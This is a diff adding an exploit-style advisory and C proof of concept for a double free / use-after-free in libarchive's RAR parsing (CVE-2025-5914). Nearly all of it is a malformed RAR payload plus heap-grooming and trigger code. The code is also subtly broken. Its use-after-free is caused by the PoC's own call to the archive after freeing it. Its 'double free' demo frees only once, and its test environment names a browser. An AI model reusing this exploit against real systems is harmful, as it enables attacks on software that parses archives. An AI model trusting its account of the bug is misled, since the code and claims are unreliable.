@@ -1,0 +1,182 @@
+=============================================================================================================================================
+| # Title     : libarchive RAR 3.8.0 Parsing Double Free / Use-After-Free                                                                   |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://github.com/libarchive/                                                                                              |
+=============================================================================================================================================
+
+[+] References :  
+
+[+] Summary    :  This proof of concept demonstrates a memory management flaw in vulnerable versions of libarchive (< 3.8.0) when handling malformed RAR headers. 
+                  By supplying a corrupted RAR structure, the code forces error paths during archive parsing, leading to improper cleanup. As a result, the archive object 
+                  may be freed and then accessed again, triggering a use‑after‑free and, in certain builds, a double free condition. 
+                  The PoC is intended for diagnostic and educational purposes, typically observable through memory analysis tools such as Valgrind or AddressSanitizer, and does not constitute a reliable exploit.
+
+[+] POC :
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <archive.h>
+#include <archive_entry.h>
+
+const unsigned char MALICIOUS_RAR[] = {
+
+    0x52, 0x61, 0x72, 0x21, 0x1A, 0x07, 0x00,
+    0xE6, 0xD5,
+    0x73,
+    0x80, 0x00,
+    0x1A, 0x00,
+    0xFF, 0xFF,
+    0x00, 0x90,
+    0x1F, 0x00,
+    0xFF, 0xFF, 0xFF, 0x7F,
+    0x00, 0x00, 0x00, 0x00,
+    0x03,
+    0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00,
+    0x14,
+    0x30,
+    0x01, 0x00,
+    0x00, 0x00, 0x00, 0x00,
+    0x41
+};
+
+void setup_heap_layout() {
+
+    printf("[+] Setting up heap layout...\n");
+
+    void *chunks[10];
+    for (int i = 0; i < 10; i++) {
+        chunks[i] = malloc(1024);
+        if (chunks[i]) {
+            memset(chunks[i], 'A', 1024);
+        }
+    }
+
+    for (int i = 1; i < 10; i += 2) {
+        free(chunks[i]);
+    }
+    
+    printf("[+] Heap layout prepared\n");
+}
+
+int trigger_vulnerability() {
+    struct archive *a = NULL;
+    struct archive_entry *entry = NULL;
+    int r;
+    size_t buf_size = sizeof(MALICIOUS_RAR);
+    uint8_t *buffer = (uint8_t *)malloc(buf_size);
+    
+    if (!buffer) {
+        fprintf(stderr, "[-] Failed to allocate buffer\n");
+        return 1;
+    }
+
+    memcpy(buffer, MALICIOUS_RAR, buf_size);
+
+    a = archive_read_new();
+    if (!a) {
+        fprintf(stderr, "[-] Failed to create archive object\n");
+        free(buffer);
+        return 1;
+    }
+    
+    printf("[+] Archive object created: %p\n", (void*)a);
+
+    r = archive_read_support_format_rar(a);
+    if (r != ARCHIVE_OK) {
+        printf("[-] RAR format not supported, trying all formats\n");
+        r = archive_read_support_format_all(a);
+    }
+    
+    if (r != ARCHIVE_OK) {
+        fprintf(stderr, "[-] Failed to enable RAR support\n");
+        archive_read_free(a);
+        free(buffer);
+        return 1;
+    }
+
+    printf("[+] Opening archive from memory (buffer: %p, size: %zu)\n", 
+           (void*)buffer, buf_size);
+    
+    r = archive_read_open_memory(a, buffer, buf_size);
+    if (r != ARCHIVE_OK) {
+        fprintf(stderr, "[-] archive_read_open_memory failed: %d\n", r);
+        fprintf(stderr, "Error: %s\n", archive_error_string(a));
+
+    }
+    
+    printf("[+] Attempting to read header...\n");
+    r = archive_read_next_header(a, &entry);
+    
+    if (r == ARCHIVE_OK) {
+        printf("[+] Header read successfully (unexpected!)\n");
+        const char *pathname = archive_entry_pathname(entry);
+        printf("Entry: %s\n", pathname ? pathname : "(null)");
+    } else {
+        printf("[-] Header read failed as expected: %s\n", 
+               archive_error_string(a));
+    }
+
+    if (r == ARCHIVE_OK) {
+        printf("[+] Attempting to skip data...\n");
+        r = archive_read_data_skip(a);
+        if (r != ARCHIVE_OK) {
+            printf("[-] Data skip failed: %s\n", archive_error_string(a));
+        }
+    }
+    printf("[+] First cleanup (this should free the archive object)\n");
+    r = archive_read_finish(a);
+    printf("archive_read_finish returned: %d\n", r);
+    printf("[+] Attempting to use archive object after cleanup...\n");
+    printf("Archive pointer: %p\n", (void*)a);
+    const char *err = archive_error_string(a);
+    printf("Error string (after free): %s\n", err ? err : "(null)");
+
+    free(buffer);
+   
+    return 0;
+}
+void demonstrate_heap_corruption() {
+    printf("\n[+] Demonstrating heap corruption...\n");
+    void *chunk1 = malloc(256);
+    void *chunk2 = malloc(256);
+    void *chunk3 = malloc(256);
+    
+    printf("Allocated chunks: %p, %p, %p\n", chunk1, chunk2, chunk3);
+
+    if (chunk1) memset(chunk1, 'B', 256);
+    if (chunk2) memset(chunk2, 'C', 256);
+    if (chunk3) memset(chunk3, 'D', 256);
+
+    printf("[+] Simulating double free...\n");
+    if (chunk2) {
+        free(chunk2);
+    }
+    printf("[+] Heap operations completed\n");
+}
+
+int main(int argc, char *argv[]) {
+    printf("[+] CVE-2025-5914 - libarchive RAR Double Free PoC\n");
+    printf("[+] Target: libarchive < 3.8.0\n");
+    printf("[+] Architecture: %s\n", 
+           "x86_64"
+           "unknown"
+    );
+    printf("[+] libarchive version: %s\n", archive_version_details());
+    setup_heap_layout();
+    printf("\n[+] Triggering vulnerability...\n");
+    int result = trigger_vulnerability();
+    demonstrate_heap_corruption();
+    printf("\n[+] PoC completed\n");
+    printf("[+] Expected result: Double free detected by Valgrind\n");
+    printf("[+] Look for 'Invalid read' and 'free'd' messages in Valgrind output\n");
+    
+    return result;
+}
+	
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
